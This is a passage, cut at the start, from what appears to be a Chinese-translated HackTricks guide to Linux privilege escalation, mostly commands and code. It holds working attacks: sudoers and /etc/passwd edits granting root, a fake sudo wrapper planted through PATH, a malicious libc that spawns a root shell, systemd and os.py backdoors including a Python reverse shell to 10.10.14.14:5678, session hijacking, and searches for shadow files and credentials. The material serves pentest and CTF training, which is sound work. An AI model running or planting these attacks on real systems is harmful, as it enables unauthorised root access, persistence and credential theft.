bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其中任意已创建文件具有**写权限**，则可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 为某个用户和 PID **创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且拥有该用户的 shell，且其 PID 为 1234，那么无需知道密码即可通过以下操作**获取 sudo 权限**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 目录中的文件用于配置谁可以使用 `sudo` 以及如何使用。这些文件**默认只能由 root 用户和 root 组读取**。\
**如果**你能够**读取**此文件，就可能**获取一些有价值的信息**；如果你能够**写入**任意文件，就可以**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你能写入，就能滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方式：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` binary 的工具，例如 OpenBSD 的 `doas`。记得检查其配置文件 `/etc/doas.conf`。
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
如果 `doas` 允许使用编辑器或解释器，请检查 GTFOBins 风格的逃逸方式：
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

如果你知道某个 **user 通常会连接到一台 machine 并使用 `sudo`** 来提升权限，而你已经在该 user context 中获取了 shell，那么你可以 **创建一个新的 sudo executable**，让它以 root 身份执行你的代码，然后再执行该 user 的 command。接着，**修改该 user context 的 $PATH**（例如，将新路径添加到 `.bash_profile` 中），这样当该 user 执行 sudo 时，就会执行你的 sudo executable。

请注意，如果该 user 使用的是其他 shell（而不是 bash），你需要修改其他文件来添加新路径。例如，[sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`、`~/.zshrc` 和 `~/.bash_profile`。你还可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似以下的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

文件 `/etc/ld.so.conf` 指示**已加载的配置文件来自哪里**。通常，此文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。这些配置文件**指向其他文件夹**，系统将在其中**搜索** **libraries**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索 libraries**。

如果由于某种原因，**某个用户对**以下任一路径具有**写入权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任何文件，或 `/etc/ld.so.conf.d/*.conf` 中配置文件所指定的任何文件夹，则该用户可能能够提升权限。\
请查看以下页面，了解**如何利用此错误配置**：


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将该 lib 复制到 `/var/tmp/flag15/`，程序将按照 `RPATH` 变量的指定，在此位置使用它。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 在 `/var/tmp` 中创建一个恶意库。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities 为 **process 提供一部分可用的 root privileges**。这实际上将 root **privileges 拆分为更小且彼此独立的单元**。随后可以将这些单元分别授予各个 process。这样可以减少完整的 privileges 集合，从而降低被 exploitation 的风险。\
阅读以下页面，**了解更多关于 capabilities 以及如何 abuse 它们的信息**：


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

在目录中，**"execute" bit** 表示受影响的 user 可以进入该文件夹（执行 "**cd**"）。\
**"read" bit** 表示 user 可以 **list** 其中的 **files**，而 **"write" bit** 表示 user 可以 **delete** 和 **create** 新的 **files**。

## ACLs

Access Control Lists（ACLs）表示 discretionary permissions 的第二层，能够 **override 传统的 ugo/rwx permissions**。这些 permissions 通过允许或拒绝特定 users 的 rights 来增强对 file 或 directory access 的控制，这些 users 不是 owner，也不属于相应的 group。这种级别的 **granularity 可确保更精确的 access management**。更多详细信息请参见[**此处**](https://linuxconfig.org/how-to-manage-acls-on-linux)。<sup>[[19]](#references)</sup>

**Give** user "kali" 对某个 file 的 read 和 write permissions：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取系统中具有特定 ACL 的文件：**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins 中隐藏的 ACL 后门

一种常见的错误配置是：`/etc/sudoers.d/` 中有一个归 root 所有、权限模式为 `440` 的文件，但仍通过 ACL 向低权限用户授予了写入权限。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
如果你看到类似 `user:alice:rw-` 的内容，该用户即使受到严格的模式位限制，也可以追加 sudo 规则：
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
这是一个影响很大的 ACL persistence/privesc 路径，因为在仅通过 `ls -l` 进行审查时很容易忽略它。

## 打开 shell 会话

在**旧版本**中，你可能可以**劫持**其他用户（**root**）的某些 **shell** 会话。\
在**最新版本**中，你只能**连接**到属于**你自己的用户**的 screen 会话。不过，你可能会在**会话内部**找到**有价值的信息**。

### screen sessions hijacking

**列出 screen 会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen 会话劫持 - Socket 位置（某些系统会将其中一个作为另一个的符号链接暴露）：ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是 **旧版 tmux** 中存在的问题。我无法以非特权用户身份劫持由 root 创建的 tmux（v2.1）会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket locations（某些系统会将其中一个作为另一个的符号链接公开）- tmux sessions hijacking：tmux -S /tmp/dev sess ls 使用该 socket 列出会话，你可以在该 socket 中启动 tmux session...](<../../images/image (837).png>)

**连接到一个 session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
查看 **HTB 的 Valentine box** 作为示例。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006 年 9 月至 2008 年 5 月 13 日期间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥都可能受到此 bug 的影响。\
在这些 OS 中创建新的 ssh key 时会触发此 bug，因为**只有 32,768 种可能的变体**。这意味着可以计算出所有可能性，并且**通过 ssh public key 可以搜索对应的 private key**。你可以在这里找到已计算出的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 有趣的配置值

- **PasswordAuthentication：** 指定是否允许使用 password authentication。默认值为 `no`。
- **PubkeyAuthentication：** 指定是否允许使用 public key authentication。默认值为 `yes`。
- **PermitEmptyPasswords**：当允许 password authentication 时，指定 server 是否允许使用空 password 字符串登录账户。默认值为 `no`。

### 登录控制文件

这些文件会影响谁可以登录以及登录方式：

- **`/etc/nologin`**：如果存在，则阻止非 root 用户登录并显示其中的消息。
- **`/etc/securetty`**：限制 root 可以登录的位置（TTY allowlist）。
- **`/etc/motd`**：登录后的 banner（可能会 leak 环境或维护相关详情）。

### PermitRootLogin

指定 root 是否可以使用 ssh 登录，默认值为 `no`。可能的值包括：

- `yes`：root 可以使用 password 和 private key 登录
- `without-password` 或 `prohibit-password`：root 只能使用 private key 登录
- `forced-commands-only`：Root 只能使用 private key 登录，并且必须指定 commands options
- `no`：不允许

### AuthorizedKeysFile

指定包含可用于 user authentication 的 public keys 的文件。它可以包含 `%h` 等 tokens，这些 tokens 会被替换为 home directory。**你可以指定 absolute paths**（以 `/` 开头）或**相对于用户 home 的 relative paths**。例如：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示：如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 将把你的 key 的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的 key 进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你**使用本地 SSH keys，而无需将 keys 留在服务器上**（没有 passphrases！）。因此，你可以通过 ssh **跳转**到**一台主机**，然后从那里**使用**位于**初始主机**中的 **key** **跳转**到另一台主机。

你需要在 `$HOME/.ssh.config` 中按如下方式设置此选项：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每当用户跳转到另一台机器时，该主机都能够访问这些密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以**覆盖**这些**选项**，并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以通过关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent forwarding（默认允许）。

如果你发现某个环境配置了 Forward Agent，请阅读以下页面，因为你**可能能够滥用它来提升权限**：


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profile 文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件都是**用户运行新 shell 时执行的脚本**。因此，如果你能够**写入或修改其中任何一个文件，就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何奇怪的 profile script，应检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

根据 OS 的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此，建议**查找所有这些文件**，并**检查是否可以读取**它们，以确认文件中**是否包含 hashes**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效）文件中找到**密码哈希值**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
然后添加用户 `hacker`，并设置生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在可以使用 `su` 命令和 `hacker:hacker`

或者，可以使用以下几行添加一个没有密码的 dummy user。\
警告：这可能会降低当前机器的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台中，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，此外，`/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能否写入某个**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果该机器正在运行 **tomcat** 服务器，并且你可以**修改 /etc/systemd/ 中的 Tomcat 服务配置文件，**那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在 tomcat 下次启动时执行。

### 检查目录

以下目录可能包含备份或有趣的信息：**/tmp**、**/var/tmp**、**/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（你可能无法读取最后一个目录，但请尝试）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 异常位置/归属文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history、.sudo_as_admin_successful、profile、bashrc、httpd.conf、.plan、.htpasswd、.git-credentials、.rhosts、hosts.equiv、Dockerfile、docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 包含密码的已知文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**多个可能包含密码的文件**。\
你还可以使用的**另一个有趣工具**是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，用于检索 Windows、Linux 和 Mac 本地计算机上存储的大量密码。

### 日志

如果你能够读取日志，就可能在**其中找到有趣/机密的信息**。日志越异常，就越有趣（可能是这样）。\
此外，一些配置 "**不当**"（可能被植入后门？）的**审计日志**可能允许你**在审计日志中记录密码**，正如这篇文章所述：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志，加入**[**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group)**组**会非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件的**名称**或**内容**中是否包含 "**password**"，并检查日志中是否存在 IP 和 email，或匹配 hash 的 regex。\
这里不打算列出完成所有这些操作的方法，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道某个 Python 脚本将从**哪里**执行，并且你**可以写入**该目录，或者你**可以修改 Python libraries**，那么你可以修改 OS library 并对其进行 backdoor（如果你可以写入 Python 脚本将要执行的目录，请复制并粘贴 os.py library）。

要对 **library 进行 backdoor**，只需在 os.py library 的末尾添加以下行（修改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有**写权限**的用户潜在地获得提升后的权限。这是因为 `logrotate` 通常以 **root** 身份运行，并且可以被操纵来执行任意文件，尤其是在 _**/etc/bash_completion.d/**_ 等目录中。需要检查的不仅是 _/var/log_ 中的权限，还要检查应用日志轮换的任何目录中的权限。

> [!TIP]
> 此漏洞影响 `logrotate` `3.18.0` 及更早版本

有关该漏洞的更多详细信息，请参见此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx logs）** 非常相似，因此每当你发现可以修改日志时，都应检查是谁在管理这些日志，并检查是否可以通过将日志替换为符号链接来提升权限。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)<sup>[[20]](#references)</sup>

如果出于任何原因，用户能够向 _/etc/sysconfig/network-scripts_ **写入** `ifcf-<whatever>` 脚本，**或**能够**调整**现有脚本，那么你的**系统就已被攻陷**。<sup>[[20]](#references)</sup>

网络脚本（例如 _ifcg-eth0_）用于网络连接。它们看起来与 .INI 文件完全相同。不过，在 Linux 中，它们会被 Network Manager（dispatcher.d）\~sourced\~。

在我的案例中，这些网络脚本中的 `NAME=` 属性没有被正确处理。如果名称中包含**空格**，系统就会尝试执行空格之后的部分。这意味着**第一个空格之后的所有内容都会以 root 身份执行**。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 存放 **scripts**，用于 System V init（SysVinit），即 **classic Linux service management system**。它包含用于 `start`、`stop`、`restart`，有时还包括 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过 `/etc/rc?.d/` 中的 symbolic links 执行。在 Redhat 系统中，另一个路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关。Upstart 是由 Ubuntu 引入的较新的 **service management**，使用配置文件执行服务管理任务。尽管系统已转向 Upstart，由于 Upstart 中存在兼容层，SysVinit scripts 仍会与 Upstart 配置一起使用。

**systemd** 是一种现代 initialization 和 service manager，提供按需启动 daemon、automount 管理以及 system state snapshots 等高级功能。它将 distribution packages 的文件组织在 `/usr/lib/systemd/` 中，并将 administrator modifications 组织在 `/etc/systemd/system/` 中，从而简化 system administration 流程。<sup>[[21]](#references)</sup>

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常会 hook 一个 syscall，以向 userspace manager 暴露特权 kernel functionality。弱 manager authentication（例如基于 FD-order 的 signature checks 或不安全的 password schemes）可能使本地 app 冒充 manager，并在已经 root 的设备上提升至 root 权限。更多信息和 exploitation details 请参阅：


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations 中由 regex 驱动的 service discovery 可以从 process command lines 中提取 binary path，并在 privileged context 下使用 -v 执行该路径。宽松的 patterns（例如使用 \S）可能匹配攻击者预先放置在 writable locations 中的 listeners（例如 /tmp/httpd），从而以 root 身份执行（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

更多信息以及适用于其他 discovery/monitoring stacks 的 generalized pattern，请参阅：

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **寻找 Linux local privilege escalation vectors 的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 枚举 Linux 和 MAC 中的 kernel vulns [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation Guide](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [No one expect command execution!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Tips and Tricks for Linux Priv Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Enumeration & Privilege Escalation tool](https://github.com/rtcrowley/linux-private-i)
- [14] [What is a Socket?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Get on the D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [How to manage ACLs on Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root through network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [What is systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Elevation of Privilege](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [32] [Python importlib docs](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet by @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Logging Passwords On Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Details Of A Logrotate Race Condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)

{{#include ../../../banners/hacktricks-training.md}}
